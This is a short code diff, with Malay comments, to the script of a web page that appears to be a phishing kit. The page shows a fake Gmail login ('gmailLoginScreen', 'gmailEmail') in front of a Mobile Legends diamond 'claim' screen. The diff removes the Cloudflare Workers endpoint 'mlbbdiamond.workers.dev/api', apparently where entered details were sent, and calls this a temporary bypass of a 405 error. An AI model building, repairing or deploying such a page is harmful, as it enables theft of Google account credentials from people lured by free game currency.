@@ -154,12 +154,10 @@
 <script>
   const IMG_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT56sob8xGvSv3lq-K-P_JpZ4RUNbgawx80FuV_EkJwcw&s=10";
 
-  /* ============ KONFIGURASI WORKER ============ */
-  // URL ini telah ditukar dengan menambah /api di hujung supaya tidak berlaku ralat 405
-  const WORKER_URL = "https://mlbbdiamond.mlbbdiamond.workers.dev/api";
+    /* ============ KONFIGURASI WORKER (BYPASS) ============ */
+  // Kita buang sementara sambungan ke server untuk elak ralat 405
   const FETCH_TIMEOUT_MS = 10000;
-  /* ============================================== */
-
+  /* ==================================================== */
   const gmailLoginScreen = document.getElementById('gmailLoginScreen');
   const claimScreen = document.getElementById('claimScreen');
   const gmailEmail = document.getElementById('gmailEmail');
